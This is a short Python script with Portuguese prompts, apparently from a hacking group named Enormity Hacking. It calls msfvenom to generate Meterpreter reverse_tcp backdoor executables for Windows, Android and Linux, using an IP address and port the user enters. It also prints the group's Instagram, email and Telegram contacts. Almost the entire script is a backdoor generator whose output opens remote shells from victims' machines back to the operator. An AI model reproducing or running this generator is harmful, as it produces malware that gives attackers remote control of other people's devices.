import os
import socket
from time import sleep

while True:
 sleep(4)
 print ("[1]Windows\n[2]Android\n[3]Linux\n[4]Enormity-Hacking\n[5]Creditos\n[6]Sair")
 print("\n")
 escolher = int(input("Escolha um opção: "))


 if escolher  == 1:

  ip = input("Digite seu ip: ")

  port = input("Digite uma porta: ")

  nome = input("Digite o nome da backdoor: ") 

  os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > {nome}.exe")


 elif  escolher ==  2:
  ip = input("Digite seu ip: ")

  port = input("Digite uma porta: ")

  nome = input("Digite o nome da backdoor: ") 

  os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f apk > {nome}.apk")


 elif escolher == 3:
  ip = input("Digite seu ip: ")

  port = input("Digite uma porta: ")

  nome = input("Digite o nome da backdoor: ") 

  os.system(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > {nome}.elf")



 elif escolher == 4:

  print ("Enormity é um grupo de desenvolvedores e pentest . Caso esteja interessado em entrar nos contate\n\n")
  print ("Intagram: EnormityHacking\n\nEmail:enormityhacking01@gmail.com\n\nTelegram:t.me/EnormityHackingOrg\n")


 elif escolher == 5:

  print("Desenvolvedor: SNISS vulgo Thomas\n\n")

 elif escolher == 6:

  break

 else:
  print ("Opção invalida!\n")
